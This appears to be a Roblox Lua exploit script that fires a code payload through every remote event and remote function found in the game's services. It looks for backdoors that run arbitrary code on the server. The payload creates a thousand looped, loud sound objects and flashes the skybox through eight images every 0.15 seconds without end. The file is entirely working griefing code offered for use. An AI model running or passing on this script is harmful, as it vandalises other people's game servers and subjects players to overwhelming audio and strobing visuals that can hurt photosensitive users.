
local containers = {
    game:GetService("ReplicatedStorage"),
    game:GetService("Workspace"),
    game:GetService("Players"),
    game:GetService("Lighting"),
    game:GetService("StarterPack"),
    game:GetService("StarterGui"),
    game:GetService("StarterPlayer"),
    game:GetService("Teams"),
    game:GetService("SoundService"),
}

local payload = [[
local imageOne = "http://www.roblox.com/asset/?id=169585459"
local imageTwo = "http://www.roblox.com/asset/?id=169585475"
local imageThree = "http://www.roblox.com/asset/?id=169585485"
local imageFour = "http://www.roblox.com/asset/?id=169585502"
local imageFive = "http://www.roblox.com/asset/?id=169585515"
local imageSix = "http://www.roblox.com/asset/?id=169585502"
local imageSeven = "http://www.roblox.com/asset/?id=169585485"
local imageEight = "http://www.roblox.com/asset/?id=169585475"
for i = 1, 1000 do
    local Spooky = Instance.new("Sound")
    Spooky.Name = "Spooky" .. i
    Spooky.SoundId = "rbxassetid://104181508980428"
    Spooky.Volume = 10
    Spooky.Looped = true
    Spooky.Pitch = 0.2
    Spooky.Parent = workspace
    Spooky:Play()
end
local Spooky = Instance.new("Sound", workspace)
Spooky.Name = "Spooky"
Spooky.SoundId = "rbxassetid://174270407"
Spooky.Volume = 15
Spooky.Looped = true
Spooky:Play()
local Sky = Instance.new("Sky", game.Lighting)
Sky.SkyboxBk = imageOne
Sky.SkyboxDn = imageOne
Sky.SkyboxFt = imageOne
Sky.SkyboxLf = imageOne
Sky.SkyboxRt = imageOne
Sky.SkyboxUp = imageOne
while true do
    Sky.SkyboxBk = imageOne
    Sky.SkyboxDn = imageOne
    Sky.SkyboxFt = imageOne
    Sky.SkyboxLf = imageOne
    Sky.SkyboxRt = imageOne
    Sky.SkyboxUp = imageOne
    wait(0.15)
    Sky.SkyboxBk = imageTwo
    Sky.SkyboxDn = imageTwo
    Sky.SkyboxFt = imageTwo
    Sky.SkyboxLf = imageTwo
    Sky.SkyboxRt = imageTwo
    Sky.SkyboxUp = imageTwo
    wait(0.15)
    Sky.SkyboxBk = imageThree
    Sky.SkyboxDn = imageThree
    Sky.SkyboxFt = imageThree
    Sky.SkyboxLf = imageThree
    Sky.SkyboxRt = imageThree
    Sky.SkyboxUp = imageThree
    wait(0.15)
    Sky.SkyboxBk = imageFour
    Sky.SkyboxDn = imageFour
    Sky.SkyboxFt = imageFour
    Sky.SkyboxLf = imageFour
    Sky.SkyboxRt = imageFour
    Sky.SkyboxUp = imageFour
    wait(0.15)
    Sky.SkyboxBk = imageFive
    Sky.SkyboxDn = imageFive
    Sky.SkyboxFt = imageFive
    Sky.SkyboxLf = imageFive
    Sky.SkyboxRt = imageFive
    Sky.SkyboxUp = imageFive
    wait(0.15)
    Sky.SkyboxBk = imageSix
    Sky.SkyboxDn = imageSix
    Sky.SkyboxFt = imageSix
    Sky.SkyboxLf = imageSix
    Sky.SkyboxRt = imageSix
    Sky.SkyboxUp = imageSix
    wait(0.15)
    Sky.SkyboxBk = imageSeven
    Sky.SkyboxDn = imageSeven
    Sky.SkyboxFt = imageSeven
    Sky.SkyboxLf = imageSeven
    Sky.SkyboxRt = imageSeven
    Sky.SkyboxUp = imageSeven
    wait(0.15)
    Sky.SkyboxBk = imageEight
    Sky.SkyboxDn = imageEight
    Sky.SkyboxFt = imageEight
    Sky.SkyboxLf = imageEight
    Sky.SkyboxRt = imageEight
    Sky.SkyboxUp = imageEight
    wait(0.15)
end
]]

local function getAllRemotes(container)
    local remotes = {}
    for _, v in ipairs(container:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            table.insert(remotes, v)
        end
    end
    return remotes
end

local allRemotes = {}
for _, container in ipairs(containers) do
    for _, remote in ipairs(getAllRemotes(container)) do
        table.insert(allRemotes, remote)
    end
end

for _, remote in ipairs(allRemotes) do
    if remote:IsA("RemoteEvent") then
        pcall(function()
            remote:FireServer(payload)
        end)
    elseif remote:IsA("RemoteFunction") then
        pcall(function()
            remote:InvokeServer(payload)
        end)
    end
end

